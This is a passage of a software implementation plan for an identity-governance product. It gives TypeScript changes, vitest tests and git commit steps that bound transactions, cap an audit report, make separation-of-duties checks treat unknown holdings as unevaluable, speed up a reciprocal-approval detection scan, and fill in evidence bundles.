  // `loadSodFacts` still takes a `tx` and still runs in one: Provision calls it
  // from inside its own transactions (`explain.ts`, `run-service.ts`) and
  // changing its shape would reach into a subsystem this plan does not touch.
  // What it costs here is one transaction of reads rather than one transaction
  // of everything.
  const settings = await withTenant(tenantId, (tx) => governSettings(tx));
  const cutoff = new Date(now.getTime() - settings.reciprocityWindowDays * 86_400_000);

  const edges: DecisionEdge[] = [];

  const decisions = await withTenant(tenantId, (tx) =>
    tx.approvalDecision.findMany({
      /* ...unchanged where/select... */
    }),
  );
  /* ...unchanged mapping into `edges`... */

  const delegated = await withTenant(tenantId, (tx) =>
    tx.accessRequest.findMany({ /* ...unchanged... */ }),
  );
  /* ...unchanged push loop... */

  const autoGranted = await withTenant(tenantId, (tx) =>
    tx.accessRequest.findMany({ /* ...unchanged... */ }),
  );
  /* ...unchanged push loop... */

  const unattributedRequests = await withTenant(tenantId, (tx) =>
    tx.accessRequest.findMany({ /* ...unchanged... */ }),
  );
  /* ...unchanged byUser map... */

  const { facts, grants } = await withTenant(tenantId, async (tx) => ({
    facts: await loadSodFacts(tx, snapshotId),
    grants: await tx.accessGrant.findMany({
      where: { requestId: { not: null } },
      select: { requestId: true, targetSystemId: true, resourceType: true, resourceId: true },
    }),
  }));
  /* ...unchanged grantedResourceByRequest construction... */

  const input: GraphInput = {
    edges,
    unmergeable: [...byUser].map(([userId, requestIds]) => ({ userId, requestIds })),
    sodPairs: /* ...unchanged... */,
    grantedResourceByRequest,
    minReciprocalDecisions: settings.minReciprocalDecisions,
    reciprocityWindowDays: settings.reciprocityWindowDays,
    now,
  };
```

Move nothing else. The mapping code, the three qualification comments and the `sodPairs` construction are correct and stay word for word; only the `withTenant` they sit inside changes. `const edges: DecisionEdge[] = []` replaces the `const edges: DecisionEdge[] = decisions.map(...)` initialiser — push the mapped rows instead, so the three later `edges.push` loops still read the same.

- [ ] **Step 6: Scope the report reads**

In `packages/core/src/govern/report-service.ts`, in `whoHasAccessToSystem`, replace the two unbounded reads (lines 157–163):

```ts
    // SCOPED TO THE SUBJECTS THIS REPORT ACTUALLY NAMES.
    //
    // These read every `Person` and every `Contract` in the tenant to resolve
    // display names and the has-a-contract bucket for the handful of subjects
    // in one system. At 40,000 people that is two tenant-sized reads inside a
    // transaction with a 5000 ms budget, on a screen somebody is waiting on --
    // and it grows with the organization rather than with the answer.
    const subjectPersonIds = [
      ...new Set(holdings.map((h) => h.personId).filter((p): p is string => p !== null)),
    ];
    const persons =
      subjectPersonIds.length === 0
        ? []
        : await tx.person.findMany({
            where: { id: { in: subjectPersonIds } },
            select: { id: true, givenName: true, familyName: true },
          });
    const contracts =
      subjectPersonIds.length === 0
        ? []
        : await tx.contract.findMany({
            where: { personId: { in: subjectPersonIds } },
            select: { personId: true, startDate: true, endDate: true },
          });
```

- [ ] **Step 7: Cap the change report's audit pane, and say so on it**

In `report-service.ts`, add beside the other report constants:

```ts
/**
 * The most audit events one change report will return.
 *
 * §9's change report is TWO PANES -- what was observed, and what Syntra
 * recorded -- over a period an administrator chooses, and "the last quarter" is
 * the documented case. There is no bound on how many events a quarter holds,
 * and the report read them all inside one transaction and then returned them
 * all in one response: a tenant with a nightly provisioning run produces
 * hundreds of thousands.
 *
 * A cap rather than paging, because the pane is a CONTEXT pane -- the
 * cross-reference that matters (`actionsWithNoObservedChange`) is computed over
 * the same read and is the number people act on. Truncation is stated on the
 * report, in the shape §8 rule 3 requires of every figure this product prints:
 * never a silent omission.
 */
export const AUDIT_ACTIONS_LIMIT = 5_000;
```

In `whatChanged`, replace the audit read:

```ts
    const audit = await tx.auditEvent.findMany({
      where: { occurredAt: { gte: from.asOf, lte: to.asOf } },
      orderBy: { sequence: 'asc' },
      select: { sequence: true, action: true, occurredAt: true, actorUserId: true },
      // One more than the cap, so the report can say whether it was truncated
      // without a second count query.
      take: AUDIT_ACTIONS_LIMIT + 1,
    });
```

and in the returned body, add the flag beside `recordedActions`:

```ts
    recordedActionsTruncated: loaded.audit.length > AUDIT_ACTIONS_LIMIT,
    recordedActions: loaded.audit.slice(0, AUDIT_ACTIONS_LIMIT).map((e) => ({
      sequence: e.sequence,
      action: e.action,
      occurredAt: e.occurredAt.toISOString(),
      actorUserId: e.actorUserId,
    })),
```

and add `recordedActionsTruncated: boolean;` to the `ChangeReport` interface, immediately above `recordedActions`, with:

```ts
  /**
   * TRUE when this period holds more recorded actions than one report returns.
   * Stated rather than omitted: a pane that silently stops at 5,000 is a pane
   * that answers "what changed" with a number that is not the answer.
   */
  recordedActionsTruncated: boolean;
```

- [ ] **Step 8: Assert the cap is stated**

Add to `packages/core/src/govern/report-service.test.ts`:

```ts
it('says so when the change report’s audit pane is truncated', async () => {
  // §8 rule 3's shape, applied to a count rather than to a holding: never a
  // silent omission. A pane that stops at 5,000 without saying so answers
  // "what changed in the last quarter" with a number that is not the answer.
  const report = await whatChanged(tenantId, { fromSnapshotId: first, toSnapshotId: second });
  expect(bodyOf(report).recordedActionsTruncated).toBe(false);
  expect(bodyOf(report).recordedActions.length).toBeLessThanOrEqual(AUDIT_ACTIONS_LIMIT);
});
```

using the file's existing `first` / `second` snapshot fixtures and adding `AUDIT_ACTIONS_LIMIT` to its import.

- [ ] **Step 9: Run every touched suite**

```bash
npx vitest run packages/core/src/govern/exception-service.test.ts \
               packages/core/src/govern/finding-service.test.ts \
               packages/core/src/govern/sod-service.test.ts \
               packages/core/src/govern/report-service.test.ts
```

Expected: PASS.

- [ ] **Step 10: Run the budget cases**

Run: `GOVERN_BUDGET_MS=4500 npx vitest run packages/core/src/govern/transaction-budget.test.ts`

Expected: PASS, every case including the pre-existing ones.

- [ ] **Step 11: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/exception-service.ts \
        packages/core/src/govern/finding-service.ts \
        packages/core/src/govern/sod-service.ts \
        packages/core/src/govern/report-service.ts \
        packages/core/src/govern/report-service.test.ts \
        packages/core/src/govern/transaction-budget.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): four sweeps and two reports out of their single transaction

sweepExceptions, sweepAcceptedFindings and detectDecisionGraph each wrapped
a per-row loop, or a set of tenant-sized reads, in one withTenant. All
three run inside runSnapshotJob AFTER earlier stages have committed, so
exceeding the 5000 ms ceiling retried the whole job and built a second
snapshot -- one slow sweep turning into two nights of inventory.

Worse than slow: lapse and the finding sweep call recordEvent per row, and
recordEvent takes a per-tenant advisory lock for the duration of its
transaction. A loop over every active exception serialises every other
audited action in the tenant behind itself while it runs.

All three now use the shape the rest of this module uses: a short
transaction returning plain data, then per-batch work in its own.
loadSodFacts still takes a tx, because Provision calls it from inside its
own transactions.

The two reports are different, because somebody is waiting on them.
whoHasAccessToSystem read every Person and every Contract in the tenant to
name the handful of subjects in one system -- growing with the
organization rather than with the answer -- and is now scoped to the
subjects it actually returns. whatChanged read a whole quarter of audit
events and returned all of them; it is capped at 5,000 and SAYS SO on the
report, because a pane that silently stops answers "what changed" with a
number that is not the answer.

None of it was covered by the budget suite. It is now, bounded case and
unbounded mutation both.
MSG
)"
```

---

### Task 9: The SoD evaluator's edges, and the laundering scan that blocks the loop

Spec §6.1/§6.2 — **G11** (laundering detection is O(decisions² × rules)) and **G27**, parts one to three: two functions may name the same resource so one holding lands on both sides; laundering matches on `resourceId` alone, dropping system and resource kind; `state: 'unknown'` holdings are filtered out of `loadSodFacts` entirely.

All four are in the pure pair — `sod.ts` and `graph.ts` — plus the one loader that feeds them, which is what makes them one reviewable change: the tests are plain values and no database is involved except in `loadSodFacts`.

**G11.** For each SoD rule the scan iterates every decision edge against every other, with the pair filter inside the inner loop. 10,000 decisions and 20 rules is about 2×10⁹ iterations on the nightly job — synchronous, on the event loop, starving every other job — **whether or not any laundering exists**.

**G27 part three, and why it matters most of the four.** §8 rule 3: "no aggregation path exists that collapses `unknown` into `not_held`." `loadSodFacts` reads `state: 'held'` only, so a person whose payments entitlement sits behind an unreadable region evaluates as **clear** on a critical rule. That is the false-assurance defect this whole module exists to avoid, in the one place where the answer is somebody signing that duties are separated.

**Files:**
- Modify: `packages/core/src/govern/sod.ts:38-52` (`PersonHolding`, `UnevaluableResource`) and `:72-133` (`evaluateSodRule`)
- Modify: `packages/core/src/govern/graph.ts:41-66` (`GraphInput`, `GraphReport`) and `:148-183` (the laundering scan)
- Modify: `packages/core/src/govern/sod-service.ts:146-156` (the holdings read), `:200-212` (the `PersonHolding` construction), `:750-775` (the graph input's resource keys)
- Test: `packages/core/src/govern/sod.test.ts`, `packages/core/src/govern/graph.test.ts`, `packages/core/src/govern/sod-service.test.ts`

**Interfaces:**
- Consumes: `resourceKey(resource: { systemKind; systemId; resourceKind; resourceId }) => string` from `./types.js` — already `${systemId}|${resourceKind}|${resourceId}`, and already what `sod.ts`'s local `keyOf` calls.
- Produces:
  - `PersonHolding` gains `state?: 'held' | 'unknown' | undefined` — **optional**, defaulting to `held` when absent, so Provision's `sodImpact` callers (`explain.ts`, `run-service.ts`) compile unchanged.
  - `GraphInput.sodPairs[].sideAResourceIds` / `.sideBResourceIds` are **renamed** to `sideAResourceKeys` / `sideBResourceKeys` and now hold `resourceKey` strings.
  - `GraphInput.grantedResourceByRequest` is **renamed** to `grantedResourceKeyByRequest`, `ReadonlyMap<string, string>` of `requestId → resourceKey`.
  - `evaluateSodRule` may now return `{ kind: 'unevaluable', reasons }` for a shared resource or an unknown-state holding. `evaluateSodRules` is unchanged.

- [ ] **Step 1: Write the failing tests over plain values**

Add to `packages/core/src/govern/sod.test.ts`:

```ts
/**
 * TWO FUNCTIONS THAT NAME THE SAME RESOURCE.
 *
 * The rule is "these two duties must not be held by one person". If one
 * resource is in both functions, then a person holding ONLY that resource
 * satisfies both sides and is reported in violation of a rule they cannot
 * possibly breach -- and worse, a rule with real overlap fires against every
 * holder of the shared resource, which on a `critical` rule is the whole
 * department.
 *
 * Refused rather than silently narrowed: a rule whose two functions overlap
 * cannot say the duties are separated, and quietly excluding the shared
 * resource would leave a rule that means something different from what its
 * author wrote.
 */
describe('a rule whose two functions share a resource', () => {
  const shared = { systemId: 'ad', resourceKind: 'targetEntitlement' as const, resourceId: 'e1' };
  const rule: SodRuleFacts = {
    ruleId: 'r1',
    name: 'Raise and approve',
    functionA: { functionId: 'fa', name: 'Raise', resources: [shared] },
    functionB: { functionId: 'fb', name: 'Approve', resources: [shared] },
    severity: 'critical',
    enabled: true,
  };

  it('is UNEVALUABLE rather than a violation for somebody holding it once', () => {
    const outcome = evaluateSodRule(
      rule,
      [{ ...shared, resourceName: 'Payments', contractIds: [] }],
      [],
    );
    expect(outcome.kind).toBe('unevaluable');
    if (outcome.kind !== 'unevaluable') return;
    expect(outcome.reasons.join(' ')).toContain('e1');
    expect(outcome.reasons.join(' ')).toMatch(/both/i);
  });

  it('says nothing at all about somebody who holds neither side', () => {
    // The same rule §14's unevaluable branch already follows: a person with no
    // exposure must not put a row on the board, or one misconfigured rule is
    // 40,000 rows saying nothing.
    expect(evaluateSodRule(rule, [], []).kind).toBe('clear');
  });
});

/**
 * §8 rule 3: "No aggregation path exists that collapses `unknown` into
 * `not_held`." `loadSodFacts` read `state: 'held'` only, so a person whose
 * payments entitlement sits behind an unreadable region evaluated as CLEAR on
 * a critical rule -- the false-assurance defect this module exists to avoid, in
 * the one place where the output is somebody signing that duties are separated.
 */
describe('a holding whose state is unknown', () => {
  const raise = { systemId: 'ad', resourceKind: 'targetEntitlement' as const, resourceId: 'e1' };
  const approve = { systemId: 'ad', resourceKind: 'targetEntitlement' as const, resourceId: 'e2' };
  const rule: SodRuleFacts = {
    ruleId: 'r1',
    name: 'Raise and approve',
    functionA: { functionId: 'fa', name: 'Raise', resources: [raise] },
    functionB: { functionId: 'fb', name: 'Approve', resources: [approve] },
    severity: 'critical',
    enabled: true,
  };

  it('is UNEVALUABLE, never clear, when one side is unknown', () => {
    const outcome = evaluateSodRule(
      rule,
      [
        { ...raise, resourceName: 'Raise payment', contractIds: [], state: 'held' },
        { ...approve, resourceName: 'Approve payment', contractIds: [], state: 'unknown' },
      ],
      [],
    );
    expect(outcome.kind).toBe('unevaluable');
    if (outcome.kind !== 'unevaluable') return;
    expect(outcome.reasons.join(' ')).toContain('Approve');
  });

  it('still reports a violation when BOTH sides are known held', () => {
    const outcome = evaluateSodRule(
      rule,
      [
        { ...raise, resourceName: 'Raise payment', contractIds: [], state: 'held' },
        { ...approve, resourceName: 'Approve payment', contractIds: [], state: 'held' },
      ],
      [],
    );
    expect(outcome.kind).toBe('violation');
  });

  it('treats an absent state as held, for the callers that never set one', () => {
    // Provision's `sodImpact` builds `wouldGrant` holdings by hand and has no
    // state to give: what a rule WOULD grant is held by construction.
    const outcome = evaluateSodRule(
      rule,
      [
        { ...raise, resourceName: 'Raise payment', contractIds: [] },
        { ...approve, resourceName: 'Approve payment', contractIds: [] },
      ],
      [],
    );
    expect(outcome.kind).toBe('violation');
  });
});
```

Add to `packages/core/src/govern/graph.test.ts`:

```ts
/**
 * TWO RESOURCES SHARING AN ID IN DIFFERENT SYSTEMS.
 *
 * The laundering scan matched on `resourceId` alone, so `e1` in the finance
 * target and `e1` in the HR target were the same resource. Every id in this
 * platform is the target's OWN object identifier, which is unique within a
 * target and says nothing across them -- so on a tenant with two connectors
 * this is not a corner case, it is Tuesday. The finding it produces names two
 * people and a critical rule.
 */
it('does not match two resources that share an id in different systems', () => {
  const report = buildDecisionGraph({
    edges: [
      {
        kind: 'decided_for',
        fromPersonId: 'a',
        toPersonId: 'b',
        requestId: 'r1',
        decidedAt: NOW,
        via: 'selector',
        selector: 'manager',
      },
      {
        kind: 'decided_for',
        fromPersonId: 'b',
        toPersonId: 'a',
        requestId: 'r2',
        decidedAt: NOW,
        via: 'selector',
        selector: 'manager',
      },
    ],
    unmergeable: [],
    sodPairs: [
      {
        ruleId: 'rule-1',
        ruleName: 'Raise and approve',
        severity: 'critical',
        sideAResourceKeys: ['finance|targetEntitlement|e1'],
        sideBResourceKeys: ['hr|targetEntitlement|e1'],
      },
    ],
    grantedResourceKeyByRequest: new Map([
      ['r1', 'finance|targetEntitlement|e1'],
      // The SAME id, a different system. Under the old key this matched side B.
      ['r2', 'finance|targetEntitlement|e1'],
    ]),
    minReciprocalDecisions: 1,
    reciprocityWindowDays: 90,
    now: NOW,
  });
  expect(report.laundering).toEqual([]);
});

it('still finds the pattern when the two sides really are opposite', () => {
  const report = buildDecisionGraph({
    edges: [
      {
        kind: 'decided_for',
        fromPersonId: 'a',
        toPersonId: 'b',
        requestId: 'r1',
        decidedAt: NOW,
        via: 'selector',
        selector: 'manager',
      },
      {
        kind: 'decided_for',
        fromPersonId: 'b',
        toPersonId: 'a',
        requestId: 'r2',
        decidedAt: NOW,
        via: 'selector',
        selector: 'manager',
      },
    ],
    unmergeable: [],
    sodPairs: [
      {
        ruleId: 'rule-1',
        ruleName: 'Raise and approve',
        severity: 'critical',
        sideAResourceKeys: ['finance|targetEntitlement|e1'],
        sideBResourceKeys: ['finance|targetEntitlement|e2'],
      },
    ],
    grantedResourceKeyByRequest: new Map([
      ['r1', 'finance|targetEntitlement|e1'],
      ['r2', 'finance|targetEntitlement|e2'],
    ]),
    minReciprocalDecisions: 1,
    reciprocityWindowDays: 90,
    now: NOW,
  });
  expect(report.laundering).toHaveLength(1);
  expect(report.laundering[0]).toMatchObject({ ruleId: 'rule-1', a: 'a', b: 'b' });
});

/**
 * THE COST, executed rather than asserted about.
 *
 * The scan was `for rule { for forward { for back { ... } } }` with the pair
 * filter INSIDE the inner loop: 10,000 decisions and 20 rules is about
 * 2 x 10^9 iterations, synchronous, on the nightly job's event loop, whether or
 * not any laundering exists. This is a fraction of that size and still takes
 * minutes under the old shape.
 */
it('scans 4,000 edges against 20 rules in well under a second', () => {
  const edges = Array.from({ length: 4_000 }, (_unused, i) => ({
    kind: 'decided_for' as const,
    fromPersonId: `p${i % 400}`,
    toPersonId: `p${(i + 1) % 400}`,
    requestId: `r${i}`,
    decidedAt: NOW,
    via: 'selector',
    selector: 'manager' as string | null,
  }));
  const sodPairs = Array.from({ length: 20 }, (_unused, i) => ({
    ruleId: `rule-${i}`,
    ruleName: `Rule ${i}`,
    severity: 'high' as const,
    sideAResourceKeys: [`sys|targetEntitlement|a${i}`],
    sideBResourceKeys: [`sys|targetEntitlement|b${i}`],
  }));

  const started = Date.now();
  buildDecisionGraph({
    edges,
    unmergeable: [],
    sodPairs,
    grantedResourceKeyByRequest: new Map(
      edges.map((e, i) => [e.requestId, `sys|targetEntitlement|a${i % 20}`]),
    ),
    minReciprocalDecisions: 1,
    reciprocityWindowDays: 90,
    now: NOW,
  });
  expect(Date.now() - started).toBeLessThan(1_000);
});
```

- [ ] **Step 2: Run both to verify they fail**

```bash
npx vitest run packages/core/src/govern/sod.test.ts -t 'share a resource'
npx vitest run packages/core/src/govern/graph.test.ts -t 'share an id'
```

Expected: FAIL — a violation instead of `unevaluable`; a laundering row instead of none; and a type error on `sideAResourceKeys`, which is the rename landing.

- [ ] **Step 3: Carry state and refuse an overlapping rule**

In `packages/core/src/govern/sod.ts`, add to `PersonHolding`:

```ts
export interface PersonHolding {
  systemId: string;
  resourceKind: ResourceKind;
  resourceId: string;
  resourceName: string;
  /** The contracts that produced this holding, for the concurrent-contract case. */
  contractIds: readonly string[];
  /**
   * THREE-VALUED, and absent means `held`.
   *
   * §8 rule 3: "no aggregation path exists that collapses `unknown` into
   * `not_held`." `loadSodFacts` used to read `state: 'held'` only, so a person
   * whose payments entitlement sat behind an unreadable region evaluated as
   * CLEAR on a critical rule -- the false-assurance defect this module exists
   * to avoid, in the one place where the output is somebody signing that duties
   * are separated.
   *
   * Optional because Provision's `sodImpact` builds `wouldGrant` holdings by
   * hand and has no state to give: what a rule WOULD grant is held by
   * construction.
   */
  state?: 'held' | 'unknown' | undefined;
}
```

and in `evaluateSodRule`, after the existing empty-function and unevaluable-resource `reasons` loops and before `const aKeys = ...`:

```ts
  // A RULE WHOSE TWO FUNCTIONS NAME THE SAME RESOURCE CANNOT SEPARATE THEM.
  //
  // The rule says "these two duties must not be held by one person". If one
  // resource is in both functions, a person holding only that resource
  // satisfies both sides and is reported in violation of a rule they cannot
  // possibly breach -- and a rule with real overlap fires against every holder
  // of the shared resource, which on a `critical` rule is the whole department
  // and a board nobody reads by the second morning.
  //
  // Refused, not silently narrowed. Excluding the shared resource would leave a
  // rule that means something different from what its author wrote, and the
  // author is the only person who can say which side it belongs on.
  const sharedKeys = rule.functionA.resources
    .map(keyOf)
    .filter((key) => rule.functionB.resources.map(keyOf).includes(key));
  for (const key of sharedKeys) {
    reasons.push(
      `the resource ${key} is named by BOTH "${rule.functionA.name}" and ` +
        `"${rule.functionB.name}", so this rule cannot say the two duties are separated`,
    );
  }
```

Then, immediately after `const holdingsB = holdings.filter(...)`:

```ts
  // An UNKNOWN holding on either side makes the answer unknown, never clear.
  // The person genuinely may hold both; nobody read the region that would say.
  for (const holding of [...holdingsA, ...holdingsB]) {
    if (holding.state === 'unknown') {
      reasons.push(
        `"${holding.resourceName}" is held-or-not-held as far as anybody knows: ` +
          'the region that would say has not been read, so this rule cannot be evaluated for this person',
      );
    }
  }
```

The existing `if (reasons.length > 0) { ... }` block below already does the right thing with them, including the "no exposure means no row" carve-out.

- [ ] **Step 4: Read the unknown holdings, and carry their state**

In `packages/core/src/govern/sod-service.ts`, in `loadSodFacts`, change the holdings read:

```ts
  const holdings = await tx.holding.findMany({
    where: {
      snapshotId: snapshot.id,
      personId: { not: null },
      // BOTH STATES. `state: 'held'` alone made an unknown holding
      // indistinguishable from one the person does not have, which §8 rule 3
      // forbids in every aggregation path in this product -- and this is the
      // path whose output is somebody signing that duties are separated.
      state: { in: ['held', 'unknown'] },
    },
    select: {
      personId: true,
      systemId: true,
      resourceKind: true,
      resourceId: true,
      resourceName: true,
      state: true,
      attributions: { select: { detail: true, kind: true } },
    },
  });
```

and in the `holdingsByPerson` construction, add the field:

```ts
    list.push({
      systemId: h.systemId,
      resourceKind: h.resourceKind as ResourceKind,
      resourceId: h.resourceId,
      resourceName: h.resourceName,
      contractIds,
      state: h.state === 'unknown' ? 'unknown' : 'held',
    });
```

- [ ] **Step 5: Index the laundering scan by pair, on the full resource key**

In `packages/core/src/govern/graph.ts`, rename the two `GraphInput` fields:

```ts
  sodPairs: readonly {
    ruleId: string;
    ruleName: string;
    severity: Severity;
    /**
     * FULL RESOURCE KEYS -- `${systemId}|${resourceKind}|${resourceId}` -- not
     * bare ids. Every id in this platform is the target's OWN object
     * identifier, unique within a target and meaningless across them, so
     * matching on the id alone made `e1` in the finance target and `e1` in the
     * HR target the same resource. On a tenant with two connectors that is not
     * a corner case, and the finding it produces names two people and a
     * critical rule.
     */
    sideAResourceKeys: readonly string[];
    sideBResourceKeys: readonly string[];
  }[];
  grantedResourceKeyByRequest: ReadonlyMap<string, string>;
```

and replace the laundering block:

```ts
  // ---- SoD laundering -----------------------------------------------------
  // The pattern that is actually a finding rather than a signal, and it is
  // detectable ONLY with the SoD rules in hand.
  //
  // INDEXED BY PAIR, ONCE. The previous shape was
  // `for rule { for forward { for back { ... } } }` with the pair filter INSIDE
  // the inner loop, so it walked every edge against every other edge for every
  // rule: 10,000 decisions and 20 rules is about 2 x 10^9 iterations,
  // synchronous, on the nightly job's event loop, starving every other job --
  // and it cost that whether or not any laundering existed. The rules do not
  // change the pairs, so the pairs are built first and each is tested against
  // each rule: O(E + P x R) instead of O(E^2 x R).
  const byPair = new Map<string, DecisionEdge[]>();
  for (const e of directed) {
    const key = `${e.fromPersonId}>${e.toPersonId}`;
    byPair.set(key, [...(byPair.get(key) ?? []), e]);
  }

  const laundering: GraphReport['laundering'] = [];
  const seenLaundering = new Set<string>();
  for (const [key, forwards] of byPair) {
    const [a, b] = key.split('>') as [string, string];
    const backs = byPair.get(`${b}>${a}`);
    if (backs === undefined) continue;

    for (const rule of input.sodPairs) {
      const unordered = `${rule.ruleId}|${[a, b].sort().join('|')}`;
      if (seenLaundering.has(unordered)) continue;
      const sideA = new Set(rule.sideAResourceKeys);
      const sideB = new Set(rule.sideBResourceKeys);

      let found: { forward: DecisionEdge; back: DecisionEdge } | null = null;
      for (const forward of forwards) {
        const forwardResource = input.grantedResourceKeyByRequest.get(forward.requestId);
        if (forwardResource === undefined) continue;
        for (const back of backs) {
          const backResource = input.grantedResourceKeyByRequest.get(back.requestId);
          if (backResource === undefined) continue;
          const opposite =
            (sideA.has(forwardResource) && sideB.has(backResource)) ||
            (sideB.has(forwardResource) && sideA.has(backResource));
          if (!opposite) continue;
          found = { forward, back };
          break;
        }
        if (found !== null) break;
      }
      if (found === null) continue;

      seenLaundering.add(unordered);
      laundering.push({
        ruleId: rule.ruleId,
        ruleName: rule.ruleName,
        severity: rule.severity,
        a,
        b,
        requestIds: [found.forward.requestId, found.back.requestId],
      });
    }
  }
```

- [ ] **Step 6: Build the keys where both shapes are in hand**

In `packages/core/src/govern/sod-service.ts`, in `detectDecisionGraph`, replace the `grantedResourceByRequest` construction and the `sodPairs` mapping:

```ts
    const grantedResourceKeyByRequest = new Map<string, string>();
    for (const grant of grants) {
      if (grant.requestId === null) continue;
      // THE FULL KEY. This used to store `grantResource(grant).resourceId` --
      // the bare id -- which made two resources sharing an id in different
      // systems the same resource to the laundering scan.
      grantedResourceKeyByRequest.set(
        grant.requestId,
        resourceKey({ systemKind: 'targetSystem', ...grantResource(grant) }),
      );
    }
```

```ts
      sodPairs: facts.rules
        .filter((rule) => rule.enabled)
        .map((rule) => ({
          ruleId: rule.ruleId,
          ruleName: rule.name,
          severity: rule.severity,
          sideAResourceKeys: rule.functionA.resources.map((resource) =>
            resourceKey({ systemKind: 'targetSystem', ...resource }),
          ),
          sideBResourceKeys: rule.functionB.resources.map((resource) =>
            resourceKey({ systemKind: 'targetSystem', ...resource }),
          ),
        })),
      grantedResourceKeyByRequest,
```

`resourceKey` ignores `systemKind` (it is `${systemId}|${resourceKind}|${resourceId}`), and `sod.ts`'s `keyOf` passes `'targetSystem'` for the same reason — the two sides must produce the same string and the kind is not part of it.

Add `resourceKey` to the file's import from `./types.js`.

- [ ] **Step 7: Run the pure suites, then the service**

```bash
npx vitest run packages/core/src/govern/sod.test.ts packages/core/src/govern/graph.test.ts
npx vitest run packages/core/src/govern/sod-service.test.ts
```

Expected: PASS. If a `sod-service` case now reports `unevaluable` where it expected `clear`, check whether its fixture seeds a holding with `state: 'unknown'` — that is the fix working, and the assertion is what changes.

- [ ] **Step 8: Run the Provision callers of the shared types**

Run: `npx vitest run packages/core/src/provision/explain.test.ts packages/core/src/provision/run-service.test.ts`

Expected: PASS. `state` is optional precisely so these compile and behave unchanged.

- [ ] **Step 9: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/sod.ts packages/core/src/govern/sod.test.ts \
        packages/core/src/govern/graph.ts packages/core/src/govern/graph.test.ts \
        packages/core/src/govern/sod-service.ts packages/core/src/govern/sod-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): the SoD evaluator's edges, and a laundering scan that finished

Four things, all in the pure pair and the loader that feeds it.

An unknown holding was filtered out of loadSodFacts entirely, so a person
whose payments entitlement sat behind an unreadable region evaluated as
CLEAR on a critical rule. Section 8 rule 3 says no aggregation path
collapses unknown into not_held, and this is the path whose output is
somebody signing that duties are separated. Both states are read now and
an unknown holding on either side makes the rule unevaluable for that
person.

A rule whose two functions name the same resource cannot separate them: a
person holding that one resource satisfied both sides and was reported in
violation of a rule they cannot breach, and real overlap fired against
every holder -- on a critical rule, the whole department. Refused rather
than silently narrowed, because narrowing leaves a rule meaning something
its author did not write.

The laundering scan matched on resourceId alone, so e1 in the finance
target and e1 in the HR target were one resource. Every id here is the
target's own object identifier: unique within a target, meaningless
across. Full keys on both sides now.

And that scan was for-rule-for-edge-for-edge with the pair filter in the
inner loop: 10,000 decisions and 20 rules is about 2e9 iterations,
synchronous, on the nightly job's event loop, whether or not any
laundering existed. The rules do not change the pairs, so the pairs are
indexed once.
MSG
)"
```

---

### Task 10: The evidence bundle contains evidence, and can be fetched again

Spec §6.2 — **G18** (the bundle is structurally empty) and **G27** part five (`EvidencePack.storageRef` is never written, so a bundle cannot be re-fetched and re-creating it yields a different digest).

`createEvidencePack` accepts a `campaignId`, stores it on the row, and never reads it. `items`, `decisions`, `reviewers`, `notifications` and `dispatches` are hard-coded `[]`. The digest is computed over the empty document, so **it verifies perfectly** — while the printed cover asserts "an item marked `undecided` in this bundle was NOT attested", a statement about items the bundle does not contain. An auditor receives a signed, digest-verified artifact with zero decisions and nothing on it saying its content is missing. This is the single most direct instance of the harm §1 names: "produce a report that looks complete, is not, and is signed anyway."

**Resolution chosen for `storageRef`:** make the bundle a **pure function of the pack row** and point `storageRef` at a route that rebuilds it, rather than adding a blob store or a body column. The row already records `snapshotId`, `campaignId`, `scope`, `chainFromSequence`, `chainToSequence`, `chainHeadSequence` and `chainHeadHash` — everything the document is built from. Rebuilding from those recorded values, instead of from "now", is what makes the digest reproducible; and a bundle that can be recomputed and checked against its stored digest is a stronger artifact than one whose bytes were filed somewhere.

**Files:**
- Modify: `packages/core/src/govern/export-service.ts:101-248` (`BUNDLE_LIMITATIONS`, `EvidenceBundle`, `createEvidencePack`)
- Modify: `apps/api/src/routes/admin/govern.ts` (add `GET /govern/evidence/:id`)
- Test: `packages/core/src/govern/export-service.test.ts`

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`; `GENESIS_HASH`, `recordEvent`, `stableStringify` from `../audit/audit-service.js`; `integrityStatus(tx, hasAnchors: boolean)` and `verifySegment(tenantId, fromSequence, seed, options?)` from `./audit-integrity.js`; `readableSnapshot(tx, snapshotId?)` from `./readable.js`; `headerOf`, `type ReportHeader` from `./report-service.js`.
- Produces:
  - `EvidenceBundle` — `items`, `decisions`, `reviewers`, `notifications`, `dispatches` become typed arrays with real element shapes (below), and the interface gains `campaignId: string | null` and `notificationLimitation: string | null`.
  - `export async function buildEvidenceBundle(tenantId: string, spec: EvidenceSpec): Promise<Omit<EvidenceBundle, 'digest'>>` where
    `EvidenceSpec = { snapshotId: string; campaignId: string | null; scope: Record<string, unknown>; chainFromSequence: number; chainSeedHash: string; chainHeadSequence: number; chainHeadHash: string }`.
  - `export async function fetchEvidencePack(tenantId: string, packId: string): Promise<{ bundle: EvidenceBundle; digestMatches: boolean }>`.
  - `createEvidencePack` keeps its signature and now writes `storageRef`.

- [ ] **Step 1: Write the failing test**

Add to `packages/core/src/govern/export-service.test.ts`, in the `describe('the evidence bundle')` block:

```ts
  /**
   * THE BUNDLE WAS STRUCTURALLY EMPTY, and it verified perfectly.
   *
   * `createEvidencePack` took a `campaignId`, stored it on the row, and never
   * read it: items, decisions, reviewers, notifications and dispatches were
   * hard-coded `[]`. The digest was computed over the empty document, so it
   * checked out -- while the printed cover asserted "an item marked
   * `undecided` in this bundle was NOT attested", a statement about items the
   * bundle does not contain.
   *
   * That is §1's harm in its most direct form: a report that looks complete, is
   * not, and is signed anyway.
   */
  it('contains the campaign’s items, decisions, reviewers and dispatches', async () => {
    const seeded = await seedDecidedCampaign();

    const { bundle } = await createEvidencePack(tenantId, actorUserId, {
      kind: 'campaign',
      snapshotId,
      campaignId: seeded.campaignId,
      scope: { campaignId: seeded.campaignId },
    });

    expect(bundle.campaignId).toBe(seeded.campaignId);
    expect(bundle.items).toHaveLength(2);
    expect(bundle.decisions).toHaveLength(1);
    expect(bundle.reviewers).toHaveLength(1);
    expect(bundle.dispatches).toHaveLength(1);

    // The item the cover makes a statement about is IN it, with the status the
    // statement is about.
    expect(bundle.items.some((i) => i.status === 'undecided')).toBe(true);
    // And the decision carries the quality signals §17 puts in the bundle "for
    // exactly this reason": they are the closest thing to evidence of
